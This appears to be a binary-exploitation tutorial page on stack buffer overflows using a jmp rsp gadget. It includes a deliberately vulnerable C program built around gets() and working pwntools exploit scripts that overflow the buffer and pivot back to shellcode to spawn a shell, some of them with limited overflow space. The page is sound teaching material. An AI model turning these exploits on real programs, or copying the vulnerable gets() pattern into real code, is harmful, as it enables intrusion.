# Using RSP

## Source

{% file src="../../../.gitbook/assets/rsp\_shellcode.zip" caption="Shellcode with RSP" %}

```c
#include <stdio.h>

int test = 0;

int main() {
    char input[100];

    puts("Get me with shellcode and RSP!");
    gets(input);

    if(test) {
        asm("jmp *%rsp");
        return 0;
    }
    else {
        return 0;
    }
}
```

You can ignore most of it as it's mostly there to accomodate the existence of `jmp rsp` - we don't actually want it called, so there's a negative `if` statement.

{% hint style="info" %}
The chance of `jmp esp` gadgets existing in the binary are incredible low, but what you often do instead is find a _sequence of bytes that code for jmp rsp_ and jump there - `jmp rsp` is `\xff\xe4` in shellcode, so if there's is any part of the executable section with bytes in this order, they can be used as if they are a `jmp rsp`.
{% endhint %}

## Exploitation

Try to do this yourself first, using the explanation on the previous page. Remember, RSP points at the thing _after_ the return pointer once `ret` has occured, so your shellcode goes _after_ it.

### Solution

```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

# we use elf.search() because we don't need those instructions directly,
# just anu sequence of \xff\xe4
jmp_rsp = next(elf.search(asm('jmp rsp')))

payload = flat(
    'A' * 120,                # padding
    jmp_rsp,                 # RSP will be pointing to shellcode, so we jump there
    asm(shellcraft.sh())     # place the shellcode
)

p.sendlineafter('RSP!\n', payload)
p.interactive()
```

## Limited Space

You won't always have enough overflow - perhaps you'll only have 7 or 8 bytes. What you can do in this scenario is make the shellcode after the RIP equivalent to something like

```text
sub rsp, 0x20
jmp rsp
```

Where `0x20` is the offset between the current value of RSP and the start of the buffer. In the buffer itself, we put the main shellcode. Let's try that!

```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

jmp_rsp = next(elf.search(asm('jmp rsp')))

payload = b'A' * 120
payload += p64(jmp_rsp)
payload += asm('''
    sub rsp, 10;
    jmp rsp;
''')

pause()
p.sendlineafter('RSP!\n', payload)
p.interactive()
```

The `10` is just a placeholder. Once we hit the `pause()`, we attach with radare2 and set a breakpoint on the `ret`, then continue. Once we hit it, we find the beginning of the `A` string and work out the offset between that and the current value of RSP - it's `128`!

### Solution

```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

jmp_rsp = next(elf.search(asm('jmp rsp')))

payload = asm(shellcraft.sh())
payload = payload.ljust(120, b'A')
payload += p64(jmp_rsp)
payload += asm('''
    sub rsp, 128;
    jmp rsp;
''')        # 128 we found with r2

pause()
p.sendlineafter('RSP!\n', payload)
p.interactive()
```

We successfully pivoted back to our shellcode - and because all our addresses are relative, it's completely reliable! ASLR beaten with pure shellcode.

{% hint style="warning" %}
This is harder with PIE as the location of `jmp rsp` will change, so you might have to leak PIE base!
{% endhint %}

